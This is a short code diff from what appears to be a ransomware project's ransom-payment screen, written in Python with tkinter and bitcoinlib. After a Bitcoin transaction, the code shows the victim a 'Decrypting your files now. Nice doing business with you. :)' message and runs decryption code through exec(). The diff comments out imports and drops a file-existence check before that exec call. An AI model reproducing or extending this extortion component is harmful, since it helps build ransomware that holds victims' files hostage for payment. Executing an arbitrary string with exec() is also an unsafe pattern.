@@ -1,5 +1,5 @@
-'''from tkinter import *
-from PIL import Image, ImageTk
+'''#from tkinter import *
+#from PIL import Image, ImageTk
 #from bitcoinlib.wallets import wallet_exists, wallet_create_or_open
 #from bitcoinlib.services.services import Service
 #from extract import extract_file
@@ -102,13 +102,11 @@ def clicking_submit():
                     print(f"An unexpected error occurred: {e}")
                     return
 
-                # Looks for the decryption file to decrypt a user's file
-                if os.path.exists(code_to_decrypt_files):
-                    transaction_details_label = Label(text=transaction_details, fg="blue")
-                    transaction_details_label.pack()
-                    successful_transaction_label = Label(text="Decrypting your files now. Nice doing business with you. :)", fg="green")
-                    successful_transaction_label.pack()
-                    exec(f"{code_to_decrypt_files}")
+                transaction_details_label = Label(text=transaction_details, fg="blue")
+                transaction_details_label.pack()
+                successful_transaction_label = Label(text="Decrypting your files now. Nice doing business with you. :)", fg="green")
+                successful_transaction_label.pack()
+                exec(f"{code_to_decrypt_files}")
 
         print(f"\nTransaction Details: {transaction_details}")
 
